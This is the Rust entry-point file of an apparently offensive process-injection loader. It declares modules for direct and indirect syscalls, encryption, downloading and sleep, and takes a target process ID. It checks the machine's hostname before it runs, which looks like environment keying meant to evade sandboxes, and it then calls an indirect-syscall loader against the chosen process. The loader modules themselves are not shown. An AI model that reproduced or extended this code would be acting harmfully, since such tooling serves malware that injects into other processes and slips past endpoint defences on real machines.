mod direct_syscalls;
mod crypt;
mod download;
mod sleep;
mod utils;
mod indirect_loader;
mod indirect_syscalls;

use crate::utils::check_hostname_is_valid;

 fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = std::env::args().collect();

    if args.len() != 3 {
        eprintln!("Usage: process.exe <PID> <mode: direct|indirect>");
        std::process::exit(1);
    }

    let target_pid = args[1].parse::<u32>().expect("Invalid PID format");
    let mode = args[2].as_str();

    // Validação do ambiente
    match check_hostname_is_valid() {
        Ok(true) => println!("[+] Hostname is valid"),
        Ok(false) => return Ok(()),
        Err(_) => return Err("[-] Failed to validate hostname".into()),
    }

    match mode {
        "direct" => {
            println!("[*] Running direct syscall loader...");
           // direct_syscalls::run_direct_loader(target_pid).await?;
        }
        "indirect" => {
            println!("[*] Running indirect syscall loader...");
            indirect_loader::run_indirect_loader(target_pid)?;
        }
        _ => {
            eprintln!("[-] Invalid mode. Use 'direct' or 'indirect'.");
            std::process::exit(1);
        }
    }

    Ok(())
}
